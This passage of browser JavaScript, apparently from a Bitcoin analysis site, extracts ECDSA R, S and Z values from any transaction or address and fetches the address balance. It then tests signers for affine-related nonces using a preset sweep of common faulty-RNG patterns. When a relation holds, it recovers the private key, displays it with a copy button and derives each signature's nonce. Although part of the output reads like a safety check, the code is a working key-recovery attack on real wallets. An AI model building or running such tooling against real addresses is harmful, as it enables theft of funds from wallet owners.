            const ta = document.createElement('textarea');
            ta.value = text; ta.style.position = 'fixed'; ta.style.opacity = '0';
            document.body.appendChild(ta); ta.select();
            document.execCommand('copy'); document.body.removeChild(ta);
            done();
        } catch (e) { /* ignore */ }
    }
    document.addEventListener('click', function (ev) {
        const btn = ev.target && ev.target.closest ? ev.target.closest('.rsz-copy[data-copy]') : null;
        if (!btn) return;
        const val = btn.getAttribute('data-copy');
        const done = function () { btn.classList.add('copied'); setTimeout(function () { btn.classList.remove('copied'); }, 1200); };
        if (navigator.clipboard && navigator.clipboard.writeText) {
            navigator.clipboard.writeText(val).then(done).catch(function () { fallbackCopy(val, done); });
        } else { fallbackCopy(val, done); }
    });

    // ---- Result rendering (mirrors the site's .keys-table look) ----------
    function renderResults(rsz, input, mode) {
        if (!rsz || rsz.length === 0) {
            return '<div class="rsz-status rsz-empty">No ECDSA signatures found for this ' +
                (mode === 'address' ? 'address' : 'transaction') + '.</div>';
        }

        const groups = groupByPub(rsz);
        const multi = groups.filter(function (g) { return g.sigs.length >= 2; }).length;

        let html = '';

        // Affine-nonce section — filled asynchronously once the Worker finishes.
        html += '<div id="leak-box" class="rsz-leak-box rsz-leak-pending">';
        if (multi > 0) {
            html += '<div class="rsz-status">' + spinner(14) + ' Testing ' +
                multi + ' signer' + (multi > 1 ? 's' : '') + ' for an affine-nonce relation (k2 = a&middot;k1 + b)…</div>';
        } else {
            html += '<div class="rsz-leak-note">Affine-nonce recovery needs two signatures from one key. ' +
                'Not enough here — the R &middot; S &middot; Z values are listed below.</div>';
        }
        html += '</div>';

        // Summary chips
        html += '<div class="rsz-summary">';
        html += '<span class="rsz-chip">' + rsz.length + ' signature' + (rsz.length > 1 ? 's' : '') + '</span>';
        html += '<span class="rsz-chip">' + groups.length + ' signer' + (groups.length > 1 ? 's' : '') + '</span>';
        html += '</div>';

        // Column header
        html += '<div class="rsz-thead">';
        html += '<div><img src="../assets/svgs/solid/hashtag.svg" width="13" height="13" alt=""> Transaction ID</div>';
        html += '<div><img src="../assets/svgs/solid/key.svg" width="13" height="13" alt=""> R · S · Z</div>';
        html += '<div><img src="../assets/svgs/solid/wallet.svg" width="13" height="13" alt=""> Address · Public Key</div>';
        html += '</div>';

        // Rows — tagged with the signing pubkey so leaky signers can be
        // highlighted, and each carries an (initially empty) per-row leak slot
        // that gets the recovered nonce + exact leaked-bit counts injected.
        for (let idx = 0; idx < rsz.length; idx++) {
            const e = rsz[idx];
            const txid = e.txid || (mode === 'txid' ? input.toLowerCase() : '');
            html += '<div class="rsz-row" id="rsz-row-' + idx + '" data-pub="' + escapeHtml(e.pub || '') + '">';

            html += '<div class="rsz-col rsz-col-txid"><span class="key-label">TXID</span>' +
                monoCell(txid, 'rsz-txid') + '</div>';

            html += '<div class="rsz-col rsz-col-rsz">' +
                rszLine('R', e.r) + rszLine('S', e.s) + rszLine('Z', e.z) + '</div>';

            html += '<div class="rsz-col rsz-col-addr">' +
                addrLine('ADDR', e.addr) + addrLine('PUB', e.pub) + '</div>';

            html += '<div class="rsz-leak-detail" id="rsz-leak-' + idx + '"></div>';

            html += '</div>';
        }

        return html;
    }

    // Show a mod-n scalar as a small signed integer when it is one (so b ≡ n-1
    // reads as -1); otherwise as its decimal value. Pure display.
    function abSigned(str) {
        var v = BigInt(str);
        if (v > N / 2n) v -= N;
        return v;
    }
    // Render the affine relation "k2 = a·k1 + b" for a,b (decimal strings in
    // [0,n)), collapsing a=±1 and the sign of b for readability.
    function affineEqn(aStr, bStr) {
        var a = abSigned(aStr), b = abSigned(bStr);
        var s = 'k2 = ';
        if (a === 1n) s += 'k1';
        else if (a === -1n) s += '&minus;k1';
        else s += a.toString() + '&middot;k1';
        if (b > 0n) s += ' + ' + b.toString();
        else if (b < 0n) s += ' &minus; ' + (-b).toString();
        return s;
    }

    // Fill the #leak-box after the Worker returns. `results` is per-signer;
    // `ab` is the list of [aStr,bStr] relations that were swept.
    function renderLeak(groups, results, ab) {
        // Worker unavailable / errored.
        if (results === null) {
            return '<div class="rsz-leak-note"><img src="../assets/svgs/solid/triangle-exclamation.svg" width="14" height="14" alt=""> ' +
                'Could not run the recovery engine in this browser (Web Worker unavailable). The R &middot; S &middot; Z values are shown below.</div>';
        }
        // Nobody had two signatures from one key.
        if (!results.length) {
            return '<div class="rsz-leak-note">No signer here has two signatures from one key, ' +
                'so there is no affine-nonce pair to solve. The R &middot; S &middot; Z values are listed below.</div>';
        }

        const nRel = (ab && ab.length) ? ab.length : 1;
        const primary = (ab && ab.length) ? affineEqn(ab[0][0], ab[0][1]) : 'k2 = a&middot;k1 + b';
        const found = results.filter(function (r) { return r.found; });
        let html = '';

        html += '<div class="rsz-summary">';
        html += '<span class="rsz-chip">' + results.length + ' signer' + (results.length > 1 ? 's' : '') + ' tested</span>';
        html += '<span class="rsz-chip">' + nRel + ' relation' + (nRel > 1 ? 's' : '') + ' swept</span>';
        if (found.length) html += '<span class="rsz-chip rsz-chip-danger">Affine nonce &middot; ' + found.length + ' key' + (found.length > 1 ? 's' : '') + ' recovered</span>';
        else html += '<span class="rsz-chip rsz-chip-ok">No affine-nonce relation detected</span>';
        html += '</div>';

        if (found.length) {
            found.forEach(function (r) {
                html += '<div class="rsz-vuln-box">';
                html += '<div class="rsz-vuln-title"><img src="../assets/svgs/solid/triangle-exclamation.svg" width="15" height="15" alt=""> ' +
                    'AFFINE NONCE FOUND — ' + affineEqn(r.a, r.b) +
                    ' (recovered from 2 of ' + r.usedSigs + ' signatures)</div>';
                html += '<div class="rsz-vuln-key"><span class="key-label">Signer</span>' +
                    '<code class="rsz-val rsz-addr-val">' + escapeHtml(r.addr || '—') + '</code>' + copyBtn(r.addr) + '</div>';
                html += '<div class="rsz-vuln-key"><span class="key-label">Private key</span>' +
                    '<span class="private-key">' + escapeHtml(r.priv) + '</span>' + copyBtn(r.priv) + '</div>';
                if (r.capped) {
                    html += '<div class="rsz-leak-bits">Signer has ' + r.capped +
                        ' signatures; the pair sweep used the first ' + r.usedSigs + '.</div>';
                }
                html += '</div>';
            });
        } else {
            const capNote = results.some(function (r) { return r.capped; })
                ? ' (large signers were capped to their first 16 signatures for the pair sweep)' : '';
            html += '<div class="rsz-leak-note rsz-leak-ok">Tested ' + results.length + ' signer' + (results.length > 1 ? 's' : '') +
                ' against ' + nRel + ' affine relation' + (nRel > 1 ? 's' : '') + ' (' + primary +
                (nRel > 1 ? ' plus presets' : '') + ')' + capNote +
                ' — no recoverable related-nonce pair. These signatures look safe.</div>';
        }

        return html;
    }

    // ---- Per-signature nonce reveal --------------------------------------
    // Once a signer's key d is recovered, EVERY one of its signatures has an
    // exactly-computable nonce  k = s^-1 (z + r*d) mod n. Plain mod-n
    // arithmetic, so it runs on the main thread — we surface k on each row of a
    // cracked signer as concrete proof the recovery is real.
    function mModN(a) { const r = a % N; return r < 0n ? r + N : r; }
    function nonceFor(e, d) {
        const r = BigInt('0x' + e.r), s = BigInt('0x' + e.s), z = BigInt('0x' + e.z);
        const sinv = modInverse(s, N);
        return mModN(sinv * (mModN(z) + mModN(r) * d));
    }

    // Fill each cracked signer's rows with its recovered nonce k.
    function annotateLeaks(rsz, results) {
        if (!results || !results.length) return;
        const foundByPub = {};
        results.forEach(function (r) { if (r.found) foundByPub[r.pub] = r; });

        for (let idx = 0; idx < rsz.length; idx++) {
            const e = rsz[idx];
            const res = foundByPub[e.pub];
            const row = document.getElementById('rsz-row-' + idx);
            const box = document.getElementById('rsz-leak-' + idx);
            if (!res || !row || !box) continue;

            let k;
            try { k = nonceFor(e, BigInt('0x' + res.priv)); } catch (err) { continue; }
            const kHex = '0x' + k.toString(16).padStart(64, '0');

            row.classList.add('rsz-row-vuln');
            let h = '';
            h += '<div class="rsz-leak-badge">nonce recovered</div>';
            h += '<div class="rsz-line"><span class="rsz-tag">K</span>' +
                '<code class="rsz-val rsz-nonce">' + escapeHtml(kHex) + '</code>' + copyBtn(kHex) + '</div>';
            box.innerHTML = h;
        }
    }

    // ---- Affine parameters (a, b) ----------------------------------------
    // Parse a user-supplied scalar (decimal, optional sign, or 0x-hex) into a
    // canonical [0,n) decimal string. Junk falls back to `def`.
    function parseScalarStr(raw, def) {
        var t = (raw == null ? '' : String(raw)).trim();
        if (t === '') return def;
        var neg = false;
        if (t[0] === '+') t = t.slice(1);
        else if (t[0] === '-') { neg = true; t = t.slice(1); }
        var v;
        try {
            if (/^0x[0-9a-fA-F]+$/.test(t)) v = BigInt(t);
            else if (/^[0-9]+$/.test(t)) v = BigInt(t);
            else return def;
        } catch (e) { return def; }
        if (neg) v = -v;
        v = ((v % N) + N) % N;
        return v.toString();
    }

    // Curated small affine relations swept when the user enables presets.
    // Small a and |b| model the real broken-RNG bugs (sequential / off-by-k /
    // doubling nonces). Every hit is still verified d*G == pub, so an
    // irrelevant preset can only fail to match — never a false positive.
    // (1,0) also re-detects the classic reused-nonce/same-r case for free.
    var AFFINE_PRESETS = [
        [1, 1], [1, -1], [1, 2], [1, -2], [1, 3], [1, -3],
        [2, 0], [2, 1], [2, -1], [3, 0], [1, 0]
    ];

    // Build the [aStr,bStr] sweep list: the user's (a,b) first, then the
    // curated presets (deduped) when the checkbox is on.
    function buildAbList(aStr, bStr, usePresets) {
        var list = [[aStr, bStr]];
        var seen = {}; seen[aStr + '|' + bStr] = 1;
        if (usePresets) {
            for (var i = 0; i < AFFINE_PRESETS.length; i++) {
                var pa = parseScalarStr(String(AFFINE_PRESETS[i][0]), '1');
                var pb = parseScalarStr(String(AFFINE_PRESETS[i][1]), '0');
                var k = pa + '|' + pb;
                if (!seen[k]) { seen[k] = 1; list.push([pa, pb]); }
            }
        }
        return list;
    }

    // ---- Main entry ------------------------------------------------------
    async function processTxid() {
        const input = document.getElementById("txid_input").value.trim();
        const out = document.getElementById("out_txid");
        if (!input) return;

        // How many transactions to scan (address mode). Free entry — any number.
        const limitEl = document.getElementById("txr-tx-limit");
        let want = limitEl ? parseInt(limitEl.value, 10) : 100;
        if (!want || want < 1) want = 100;

        // Affine relation k2 = a*k1 + b (mod n). Defaults a=1, b=1. The preset
        // toggle adds a curated sweep of common (a,b) — all pubkey-verified.
        const aEl = document.getElementById('aff-a');
        const bEl = document.getElementById('aff-b');
        const presetsEl = document.getElementById('aff-presets');
        const aStr = parseScalarStr(aEl ? aEl.value : '1', '1');
        const bStr = parseScalarStr(bEl ? bEl.value : '1', '1');
        const usePresets = !presetsEl || presetsEl.checked;
        const abList = buildAbList(aStr, bStr, usePresets);

        const header = getOutputHeader(out.id);
        const setStatus = function (msg) {
            out.innerHTML = header + '<div class="rsz-status">' + spinner(14) + ' ' + escapeHtml(msg) + '</div>';
        };
        const onProgress = function (p) {
            if (p.phase === 'list') {
                setStatus('Listing transactions… ' + p.listed + (p.target ? ' / ' + p.target : '') + ' found');
            } else {
                setStatus('Scanning transactions for R·S·Z… ' + p.scanned + ' / ' + p.target +
                    '  (signatures found: ' + p.found + ')');
            }
        };

        setStatus('Analyzing input (TXID or Address)…');

        try {
            let rsz = [];
            let mode = "";
            if (input.length === 64 && /^[0-9a-fA-F]+$/.test(input)) {
                mode = "txid";
                setStats(null);                            // a TXID isn't an address
                const rawtx = await getRawTx(input);
                const parsed = parsingRaw(rawtx);
                rsz = getrsz(parsed);
                rsz.forEach(function (e) { if (!e.txid) e.txid = input.toLowerCase(); });
            } else if (input.length >= 26) {
                mode = "address";
                // Balance / Received / TX first (fast) — same box as Address Analysis.
                setStatus('Fetching balance…');
                statLoading();
                try { setStats(await fetchAddressStats(input)); } catch (e) { setStats(null); }
                rsz = await resolveInputToRSZ(input, want, onProgress);
            } else {
                throw new Error("Invalid input. Paste a 64-character TXID or a Bitcoin address.");
            }

            out.innerHTML = header + renderResults(rsz, input, mode);

            // Kick off the (worker-based) affine-nonce analysis and fill in
            // #leak-box when it finishes. The page stays fully responsive.
            if (rsz && rsz.length) {
                const leakBox = document.getElementById('leak-box');
                runLeakAnalysis(rsz, abList, function (p) {
                    if (!leakBox || p.type !== 'progress') return;
                    let msg;
                    if (p.phase === 'signer') {
                        msg = 'Analyzing signer ' + (p.gi + 1) + ' / ' + p.total + ' (' + p.count + ' signatures)…';
                    } else {
                        msg = 'Signer ' + (p.gi + 1) + ' / ' + p.total + ' — testing affine relation a=' +
                            abSigned(p.a).toString() + ', b=' + abSigned(p.b).toString() + '…';
                    }
                    leakBox.innerHTML = '<div class="rsz-status">' + spinner(14) + ' ' + escapeHtml(msg) + '</div>';
                }).then(function (res) {
                    const box = document.getElementById('leak-box');
                    if (box) { box.classList.remove('rsz-leak-pending'); box.innerHTML = renderLeak(res.groups, res.results, abList); }
                    annotateLeaks(rsz, res.results);
                });
            }
        } catch (e) {
            out.innerHTML = header +
                '<div class="rsz-error"><img src="../assets/svgs/solid/triangle-exclamation.svg" width="14" height="14" alt=""> Error: ' +
                escapeHtml(e.message) + '</div>';
        }
    }

    // ---- Expose globals used by inline onclick handlers ------------------
    window.processTxid = processTxid;
    window.exportOne = exportOne;
})();
